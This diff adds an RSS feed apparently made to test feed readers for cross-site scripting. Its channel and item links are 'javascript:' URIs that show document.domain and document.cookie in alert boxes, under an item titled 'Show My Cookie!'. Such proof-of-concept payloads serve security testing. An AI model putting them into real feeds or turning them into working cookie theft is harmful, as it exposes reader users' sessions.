@@ -1,1 +1,28 @@
-test
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"
+xmlns:dc="http://purl.org/dc/elements/1.1/"
+xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+xmlns:admin="http://webns.net/mvcb/"
+xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+xmlns:content="http://purl.org/rss/1.0/modules/content/"
+xml:base="http://feed.mikle.com/">
+
+
+<channel>
+<title>Test</title>
+<link>javascript:alert(document.domain)</link>
+<description>RSS feed </description>
+<dc:language>en</dc:language>
+<dc:rights>Copyright 2015</dc:rights>
+
+<item>
+<title>Show My Cookie!</title>
+<link>javascript:alert(document.cookie);</link>
+<description>Should Steal Your Cookie.</description>
+<pubDate>Tue, 20 Sep 2005 23:55:18 EDT</pubDate>
+</item>
+
+
+</channel>
+</rss>
+
